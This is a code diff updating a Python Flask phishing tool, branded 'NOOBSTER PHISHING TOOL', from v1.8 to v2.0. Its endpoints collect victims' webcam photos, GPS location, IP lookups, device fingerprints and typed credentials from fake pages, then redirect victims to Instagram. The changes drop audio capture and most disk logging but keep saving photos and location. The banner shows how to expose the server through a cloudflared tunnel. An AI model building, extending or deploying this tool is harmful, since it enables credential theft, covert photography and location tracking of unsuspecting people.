@@ -1,6 +1,6 @@
 """
-NOOBSTER PHISHING TOOL v1.8
-Local mode. Organized folder structure.
+NOOBSTER PHISHING TOOL v2.0
+Local mode. Saves ONLY photo + location. Everything else on terminal.
 
 Telegram: https://t.me/noob11001
 """
@@ -27,10 +27,10 @@ BANNER = r"""
 ║    ███╗   ██╗ ██████╗  ██████╗ ██████╗ ███████╗████████╗     ║
 ║    ████╗  ██║██╔═══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝     ║
 ║    ██╔██╗ ██║██║   ██║██║   ██║██████╔╝███████╗   ██║        ║
-║    ██║╚██╗██║██║   ██║██║   ██║██╔══██╗╚════██║   ██║        ║
+║    ██║╚██╗ ██║██║   ██║██║   ██║██╔══██╗╚════██║   ██║        ║
 ║    ██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝███████║   ██║        ║
 ║    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝        ║
-║              P H I S H I N G   T O O L   v1.8                ║
+║              P H I S H I N G   T O O L   v2.0                ║
 ║                  t.me/noob11001                              ║
 ╚══════════════════════════════════════════════════════════════╝
 """
@@ -83,39 +83,12 @@ def safe(s, max_len=30):
 
 
 def new_folder(ip, page):
-    """create folder like: 20261002_143022_freefire_103.21.44.5_14-30-22"""
     now = datetime.now()
     date = now.strftime("%Y%m%d_%H%M%S")
     time_short = now.strftime("%H-%M-%S")
     f = os.path.join(CAPTURE_DIR, f"{date}_{safe(page)}_{safe(ip)}_{time_short}")
     os.makedirs(f, exist_ok=True)
     return f
-
-
-def sub(folder, name):
-    """create subfolder inside capture folder"""
-    p = os.path.join(folder, name)
-    os.makedirs(p, exist_ok=True)
-    return p
-
-
-def save_json(folder, subfolder, fname, data):
-    d = sub(folder, subfolder)
-    path = os.path.join(d, fname)
-    with open(path, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
-    return path
-
-
-def append_info(folder, line):
-    """append to info.txt — human readable log"""
-    path = os.path.join(folder, "info.txt")
-    with open(path, "a", encoding="utf-8") as f:
-        f.write(line + "\n")
-
-
-def ts_short():
-    return datetime.now().strftime("%H-%M-%S")
 
 
 def ts_full():
@@ -163,6 +136,7 @@ def serve_selected():
 
 # ═══════════ CAPTURE ENDPOINTS ═══════════
 
+# ─── PHOTO — SAVE ───
 @app.route("/capture/photo", methods=["POST"])
 def cap_photo():
     if not STATE["active_page"]:
@@ -172,32 +146,49 @@ def cap_photo():
     ua = request.headers.get("User-Agent", "")
     page = d.get("page", "?")
     folder = new_folder(ip, page)
-    t = ts_short()
 
     b64 = d.get("photo", "")
     if "," in b64:
         b64 = b64.split(",", 1)[1]
     try:
-        p = sub(folder, "photo")
-        path = os.path.join(p, f"photo_{t}.jpg")
+        path = os.path.join(folder, "photo.jpg")
         with open(path, "wb") as f:
             f.write(base64.b64decode(b64))
         size_kb = os.path.getsize(path) // 1024
-        print(f"  {C.G}📸 Photo{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
-        append_info(folder, f"[{ts_full()}] PHOTO       {path} ({size_kb} KB)")
+        print(f"  {C.G}📸 Photo saved{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
     except Exception as e:
         print(f"  {C.R}photo error: {e}{C.N}")
-
-    save_json(folder, "ip", f"ip_{t}.json", {
-        "timestamp": ts_full(),
-        "ip": ip,
-        "user_agent": ua,
-        "device": parse_device(ua),
-        "page": page
-    })
     return jsonify({"ok": 1})
 
 
+# ─── LOCATION — SAVE ───
+@app.route("/capture/location", methods=["POST"])
+def cap_loc():
+    if not STATE["active_page"]:
+        abort(404)
+    d = request.get_json()
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    page = d.get("page", "?")
+    folder = new_folder(ip, page)
+
+    # save
+    path = os.path.join(folder, "location.json")
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump({
+            "timestamp": ts_full(),
+            "ip": ip,
+            "data": d
+        }, f, indent=2, ensure_ascii=False)
+
+    lat = d.get("lat"); lon = d.get("lon")
+    if lat is not None:
+        gmaps = f"https://maps.google.com/?q={lat},{lon}"
+        print(f"  {C.G}📍 Location saved{C.N}  {C.D}{gmaps} (±{int(d.get('accuracy',0))}m){C.N}")
+        print(f"  {C.D}   → {path}{C.N}")
+    return jsonify({"ok": 1})
+
+
+# ─── FINGERPRINT — DISPLAY ONLY ───
 @app.route("/capture/fingerprint", methods=["POST"])
 def cap_fp():
     if not STATE["active_page"]:
@@ -206,39 +197,18 @@ def cap_fp():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ua = request.headers.get("User-Agent", "")
     page = d.get("page", "?")
-    folder = new_folder(ip, page)
-    t = ts_short()
 
-    # ipapi wala part
+    # ipapi part
     if "ipapi" in d:
         api = d["ipapi"]
-        save_json(folder, "ip", f"ipinfo_{t}.json", {
-            "timestamp": ts_full(),
-            "ip": ip,
-            "country": api.get("country_name"),
-            "country_code": api.get("country_code"),
-            "region": api.get("region"),
-            "city": api.get("city"),
-            "postal": api.get("postal"),
-            "latitude": api.get("latitude"),
-            "longitude": api.get("longitude"),
-            "timezone": api.get("timezone"),
-            "org": api.get("org"),
-            "asn": api.get("asn"),
-            "raw": api
-        })
-        print(f"  {C.Cc}🌐 IP info{C.N}  {C.D}{api.get('city')}, {api.get('country_name')} — {api.get('org')}{C.N}")
-        append_info(folder, f"[{ts_full()}] IP          {ip} — {api.get('city')}, {api.get('country_name')} — {api.get('org')}")
-        footer()
+        print(f"  {C.Cc}🌐 Location/City{C.N}  {C.D}{api.get('city')}, {api.get('region')}, "
+              f"{api.get('country_name')} ({api.get('country_code')}){C.N}")
+        print(f"  {C.Cc}🏢 ISP     :{C.N} {api.get('org')}")
+        print(f"  {C.Cc}📮 Postal  :{C.N} {api.get('postal') or '—'}   "
+              f"{C.D}TZ: {api.get('timezone')}{C.N}")
         return jsonify({"ok": 1})
 
     # device fingerprint
-    save_json(folder, "device", f"device_{t}.json", {
-        "timestamp": ts_full(),
-        "ip": ip,
-        "data": d
-    })
-
     if "screen" in d:
         bat = d.get("battery") or {}
         conn = d.get("connection") or {}
@@ -258,95 +228,31 @@ def cap_fp():
                   f"{C.D}({conn.get('downlink','?')}Mbps){C.N}")
         print(f"  {C.Cc}CPU     :{C.N} {d.get('hardwareConcurrency','?')} cores  "
               f"{C.D}RAM: {d.get('deviceMemory','?')}GB{C.N}")
-
-        append_info(folder, f"[{ts_full()}] DEVICE      {d.get('screen',{}).get('width','?')}x"
-                    f"{d.get('screen',{}).get('height','?')} "
-                    f"CPU:{d.get('hardwareConcurrency','?')} "
-                    f"RAM:{d.get('deviceMemory','?')}GB "
-                    f"GPU:{(gpu.get('renderer') or '?')[:40]} "
-                    f"TZ:{d.get('timezone','?')}")
-        if bat:
-            append_info(folder, f"[{ts_full()}] BATTERY     {int((bat.get('level') or 0)*100)}% "
-                        f"{'charging' if bat.get('charging') else 'discharging'}")
+        print(f"  {C.D}   (not saved — display only){C.N}")
     return jsonify({"ok": 1})
 
 
-@app.route("/capture/location", methods=["POST"])
-def cap_loc():
-    if not STATE["active_page"]:
-        abort(404)
-    d = request.get_json()
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    page = d.get("page", "?")
-    folder = new_folder(ip, page)
-    t = ts_short()
-
-    save_json(folder, "location", f"location_{t}.json", {
-        "timestamp": ts_full(),
-        "ip": ip,
-        "data": d
-    })
-
-    lat = d.get("lat"); lon = d.get("lon")
-    if lat is not None:
-        gmaps = f"https://maps.google.com/?q={lat},{lon}"
-        print(f"  {C.G}📍 Location{C.N}  {C.D}{gmaps} (±{int(d.get('accuracy',0))}m){C.N}")
-        append_info(folder, f"[{ts_full()}] LOCATION    lat={lat} lon={lon} "
-                    f"accuracy=±{int(d.get('accuracy',0))}m")
-        append_info(folder, f"[{ts_full()}] MAPS        {gmaps}")
-    return jsonify({"ok": 1})
-
-
-@app.route("/capture/audio", methods=["POST"])
-def cap_audio():
-    if not STATE["active_page"]:
-        abort(404)
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    page = request.form.get("page", "?")
-    folder = new_folder(ip, page)
-    t = ts_short()
-    f = request.files.get("audio")
-    if f:
-        p = sub(folder, "audio")
-        path = os.path.join(p, f"audio_{t}.webm")
-        f.save(path)
-        size_kb = os.path.getsize(path) // 1024
-        print(f"  {C.G}🎤 Audio{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
-        append_info(folder, f"[{ts_full()}] AUDIO       {path} ({size_kb} KB)")
-    return jsonify({"ok": 1})
-
-
+# ─── CREDENTIALS — DISPLAY ONLY ───
 @app.route("/capture/credentials", methods=["POST"])
 def cap_creds():
     if not STATE["active_page"]:
         abort(404)
     d = request.get_json()
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ua = request.headers.get("User-Agent", "")
     page = d.get("page", "?")
-    folder = new_folder(ip, page)
-    t = ts_short()
-
     fields = d.get("fields", {})
-    save_json(folder, "credentials", f"input_{t}.json", {
-        "timestamp": ts_full(),
-        "ip": ip,
-        "ua": ua,
-        "page": page,
-        "fields": fields
-    })
 
     print(f"  {C.BOLD}{C.R}🔑 USER INPUT{C.N}  {C.D}page: {page}{C.N}")
-    append_info(folder, f"[{ts_full()}] USER INPUT  page: {page}")
     for k, v in fields.items():
         s = str(v)
         shown = s if len(s) < 60 else s[:57] + "..."
         print(f"     {C.Cc}{k}{C.N} = {C.Y}{shown}{C.N}")
-        append_info(folder, f"[{ts_full()}]   {k} = {v}")
+    print(f"  {C.D}   (not saved — display only){C.N}")
     footer()
     return jsonify({"ok": 1, "redirect": d.get("redirect", "https://www.instagram.com")})
 
 
+# ─── DEBUG ───
 @app.route("/capture/debug", methods=["POST"])
 def cap_debug():
     d = request.get_json()
@@ -395,6 +301,7 @@ def boot():
     print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
     print(f"  {C.Cc}Local   :{C.N} {C.W}http://127.0.0.1:5000/{p['slug']}{C.N}")
     print(f"  {C.Cc}Expose  :{C.N} {C.D}cloudflared tunnel --url http://localhost:5000{C.N}")
+    print(f"  {C.Cc}Saves   :{C.N} {C.D}only photo + location{C.N}")
     print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}\n")
     app.run(host="0.0.0.0", port=5000, debug=False)
 
